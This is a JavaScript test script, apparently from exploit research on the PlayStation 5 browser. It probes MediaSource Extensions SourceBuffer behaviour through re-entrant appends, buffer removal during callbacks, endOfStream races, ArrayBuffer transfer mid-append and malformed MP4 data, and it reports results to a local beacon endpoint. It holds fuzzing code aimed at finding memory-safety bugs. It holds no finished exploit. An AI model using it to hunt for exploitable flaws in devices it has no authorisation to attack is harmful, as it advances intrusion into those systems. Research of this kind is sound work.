// p520 — MSE SourceBuffer re-entrancy and state machine confusion
//
// MediaSource Extensions confirmed available on PS5 14.20.
// SourceBuffer has 6 PLATFORM(PLAYSTATION) guards — Sony-specific paths.
//
// Attack vectors:
// T1: Feature detect MSE + SourceBuffer capabilities
// T2: appendBuffer during updateend handler (re-entrant append)
// T3: remove() during sourceopen, appendBuffer during remove
// T4: Multiple SourceBuffers — remove one during another's updateend
// T5: endOfStream during appendBuffer, abort during endOfStream
// T6: Transfer ArrayBuffer via postMessage during appendBuffer
//
// Beacon prefix: V520-

(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V520-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // T1: Feature detection
  var features = {
    MediaSource: typeof MediaSource !== 'undefined',
    isTypeSupported: false,
    SourceBuffer: typeof SourceBuffer !== 'undefined',
    URL: typeof URL !== 'undefined',
    createObjectURL: !!(typeof URL !== 'undefined' && URL.createObjectURL),
    Blob: typeof Blob !== 'undefined',
    MessageChannel: typeof MessageChannel !== 'undefined'
  };

  if (features.MediaSource) {
    try {
      features.isTypeSupported = MediaSource.isTypeSupported('video/mp4; codecs="avc1.42E01E"');
      features.webm = MediaSource.isTypeSupported('video/webm; codecs="vp8"');
      features.mp4aac = MediaSource.isTypeSupported('audio/mp4; codecs="mp4a.40.2"');
      features.avc1 = MediaSource.isTypeSupported('video/mp4; codecs="avc1.64001E"');
    } catch(e) {
      features.typeError = e.message;
    }
  }

  B('T1-FEATURES', JSON.stringify(features));

  if (!features.MediaSource) {
    B('T1-DEAD', 'MediaSource not available');
    return;
  }

  // Minimal valid MP4 init segment (ftyp + moov with single video track)
  // This is a tiny but valid MP4 initialization segment for avc1
  function makeInitSegment() {
    // Use a minimal ftyp + moov structure
    // We'll test if SourceBuffer accepts any data at all first
    var data = new Uint8Array(8);
    // ftyp box: size=8, type='ftyp' — intentionally minimal/malformed to test error handling
    data[0] = 0; data[1] = 0; data[2] = 0; data[3] = 8;
    data[4] = 0x66; data[5] = 0x74; data[6] = 0x79; data[7] = 0x70;
    return data;
  }

  var results = {};

  // T2: Basic MSE pipeline — create MediaSource, add SourceBuffer, test event lifecycle
  try {
    B('T2-START', 'basic MSE pipeline');
    var ms = new MediaSource();
    var blobUrl = URL.createObjectURL(ms);
    var video = document.createElement('video');

    var t2log = [];
    var t2sb = null;

    ms.addEventListener('sourceopen', function() {
      t2log.push('sourceopen');
      B('T2-SOURCEOPEN', 'readyState=' + ms.readyState);

      try {
        // Try to add a SourceBuffer
        var mimeType = features.isTypeSupported ? 'video/mp4; codecs="avc1.42E01E"' :
                       features.mp4aac ? 'audio/mp4; codecs="mp4a.40.2"' :
                       'video/mp4';
        t2sb = ms.addSourceBuffer(mimeType);
        t2log.push('sb-created:' + mimeType);
        B('T2-SB-CREATED', 'mode=' + t2sb.mode + ',updating=' + t2sb.updating);

        // Listen for updateend
        var appendCount = 0;
        t2sb.addEventListener('updateend', function() {
          appendCount++;
          t2log.push('updateend-' + appendCount);
          B('T2-UPDATEEND-' + appendCount, 'updating=' + t2sb.updating);

          if (appendCount === 1) {
            // T2a: Re-entrant append during updateend
            try {
              var data2 = new Uint8Array(16);
              t2sb.appendBuffer(data2);
              t2log.push('reentrant-append-started');
            } catch(e) {
              t2log.push('reentrant-append-err:' + e.name);
              B('T2-REENTRANT-ERR', e.name + ':' + e.message);
            }
          }

          if (appendCount === 2) {
            // T2b: Try abort during updateend
            try {
              t2sb.abort();
              t2log.push('abort-in-updateend');
            } catch(e) {
              t2log.push('abort-err:' + e.name);
            }
            B('T2-DONE', JSON.stringify({log: t2log.slice(0, 20)}));
          }
        });

        t2sb.addEventListener('error', function(e) {
          t2log.push('error');
          B('T2-SB-ERROR', 'error event fired');
        });

        // First append — intentionally bad data to test error handling
        var initData = makeInitSegment();
        t2sb.appendBuffer(initData);
        t2log.push('first-append');

      } catch(e) {
        t2log.push('sb-err:' + e.name + ':' + e.message);
        B('T2-SB-ERR', e.name + ': ' + e.message);
      }
    });

    ms.addEventListener('sourceended', function() {
      t2log.push('sourceended');
    });

    ms.addEventListener('sourceclose', function() {
      t2log.push('sourceclose');
    });

    video.src = blobUrl;

    // Timeout cleanup
    setTimeout(function() {
      if (t2log.length === 0) {
        B('T2-TIMEOUT', 'sourceopen never fired');
      }
      results.T2 = { log: t2log.slice(0, 20) };
    }, 3000);

  } catch(e) {
    B('T2-ERR', '' + e);
    results.T2 = { error: e.message };
  }

  // T3: Multiple SourceBuffers — remove during callback
  setTimeout(function() {
    try {
      B('T3-START', 'multiple source buffers');
      var ms3 = new MediaSource();
      var url3 = URL.createObjectURL(ms3);
      var vid3 = document.createElement('video');
      var t3log = [];

      ms3.addEventListener('sourceopen', function() {
        t3log.push('sourceopen');
        try {
          var sb1 = ms3.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
          t3log.push('sb1-created');

          // Try to add a second SourceBuffer
          try {
            var sb2 = ms3.addSourceBuffer('audio/mp4; codecs="mp4a.40.2"');
            t3log.push('sb2-created');

            // In sb1's updateend, try to remove sb2
            sb1.addEventListener('updateend', function() {
              t3log.push('sb1-updateend');
              try {
                ms3.removeSourceBuffer(sb2);
                t3log.push('sb2-removed-during-sb1-updateend');
                B('T3-REMOVED', 'sb2 removed during sb1 updateend');
              } catch(e) {
                t3log.push('remove-err:' + e.name);
              }
            });

            sb1.appendBuffer(makeInitSegment());
            t3log.push('sb1-append');

          } catch(e) {
            t3log.push('sb2-err:' + e.name);
            B('T3-SB2-ERR', e.name + ':' + e.message);
          }
        } catch(e) {
          t3log.push('sb1-err:' + e.name);
          B('T3-SB1-ERR', e.name + ':' + e.message);
        }
      });

      vid3.src = url3;

      setTimeout(function() {
        results.T3 = { log: t3log.slice(0, 20) };
        B('T3-DONE', JSON.stringify(results.T3));
      }, 3000);

    } catch(e) {
      B('T3-ERR', '' + e);
    }
  }, 4000);

  // T4: endOfStream during appendBuffer + ArrayBuffer detach
  setTimeout(function() {
    try {
      B('T4-START', 'endOfStream + detach race');
      var ms4 = new MediaSource();
      var url4 = URL.createObjectURL(ms4);
      var vid4 = document.createElement('video');
      var t4log = [];

      ms4.addEventListener('sourceopen', function() {
        t4log.push('sourceopen');
        try {
          var sb = ms4.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');

          sb.addEventListener('updatestart', function() {
            t4log.push('updatestart');
            // During updatestart, try to detach the ArrayBuffer
            try {
              ms4.endOfStream();
              t4log.push('endOfStream-during-update');
            } catch(e) {
              t4log.push('eos-err:' + e.name);
            }
          });

          sb.addEventListener('updateend', function() {
            t4log.push('updateend');
          });

          sb.addEventListener('error', function() {
            t4log.push('sb-error');
          });

          // Create an ArrayBuffer and try to detach it mid-append
          var ab = new ArrayBuffer(64);
          var view = new Uint8Array(ab);
          view[0] = 0; view[1] = 0; view[2] = 0; view[3] = 8;
          view[4] = 0x66; view[5] = 0x74; view[6] = 0x79; view[7] = 0x70;

          sb.appendBuffer(ab);
          t4log.push('append-started');

          // Try to transfer the same buffer
          try {
            var mc = new MessageChannel();
            mc.port1.postMessage('', [ab]);
            t4log.push('ab-transferred:byteLength=' + ab.byteLength);
          } catch(e) {
            t4log.push('transfer-err:' + e.name);
          }

        } catch(e) {
          t4log.push('err:' + e.name);
        }
      });

      vid4.src = url4;

      setTimeout(function() {
        results.T4 = { log: t4log.slice(0, 20) };
        B('T4-DONE', JSON.stringify(results.T4));
      }, 3000);

    } catch(e) {
      B('T4-ERR', '' + e);
    }
  }, 8000);

  // T5: SourceBuffer mode switch + duration manipulation
  setTimeout(function() {
    try {
      B('T5-START', 'mode switch + duration');
      var ms5 = new MediaSource();
      var url5 = URL.createObjectURL(ms5);
      var vid5 = document.createElement('video');
      var t5log = [];

      ms5.addEventListener('sourceopen', function() {
        t5log.push('sourceopen');
        try {
          var sb = ms5.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');

          // Try to change mode
          try {
            var origMode = sb.mode;
            sb.mode = 'sequence';
            t5log.push('mode-changed:' + origMode + '->' + sb.mode);
          } catch(e) {
            t5log.push('mode-err:' + e.name);
          }

          // Try setting timestampOffset during append
          sb.addEventListener('updatestart', function() {
            try {
              sb.timestampOffset = 999;
              t5log.push('offset-during-update:' + sb.timestampOffset);
            } catch(e) {
              t5log.push('offset-err:' + e.name);
            }
          });

          // Try setting duration during append
          sb.addEventListener('updateend', function() {
            try {
              ms5.duration = 10;
              t5log.push('duration-set:' + ms5.duration);
            } catch(e) {
              t5log.push('duration-err:' + e.name);
            }

            // Try to change mode while updating=false
            try {
              sb.mode = 'segments';
              t5log.push('mode-segments:' + sb.mode);
            } catch(e) {
              t5log.push('mode-segments-err:' + e.name);
            }
          });

          sb.appendBuffer(makeInitSegment());
          t5log.push('append-started');

        } catch(e) {
          t5log.push('err:' + e.name);
        }
      });

      vid5.src = url5;

      setTimeout(function() {
        results.T5 = { log: t5log.slice(0, 20) };
        B('T5-DONE', JSON.stringify(results.T5));
      }, 3000);

    } catch(e) {
      B('T5-ERR', '' + e);
    }
  }, 12000);

  // Final summary
  setTimeout(function() {
    B('SUMMARY', JSON.stringify(results).slice(0, 1500));
    B('COMPLETE', 'all tests done');
  }, 18000);

})();
